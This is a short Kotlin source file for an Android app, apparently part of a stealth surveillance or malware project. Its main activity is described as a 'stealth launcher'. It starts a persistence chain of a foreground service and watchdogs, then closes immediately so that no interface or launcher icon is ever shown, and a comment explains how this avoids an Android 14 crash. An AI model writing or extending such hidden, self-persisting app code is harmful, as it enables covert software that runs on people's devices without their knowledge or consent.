package org.umbra.core

import android.os.Bundle
import androidx.activity.ComponentActivity
import org.umbra.core.persistence.PersistenceChain

/**
 * Stealth launcher activity. Starts the persistence chain (foreground service +
 * watchdogs) and finishes immediately so no UI ever appears and no launcher icon
 * is shown. Finishing in onCreate() is required: with the NoDisplay theme, leaving
 * the activity alive to reach onResume() triggers Android 14's
 * "did not call finish() prior to onResume() completing" crash.
 */
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        PersistenceChain.start(this)
        finish()
    }
}
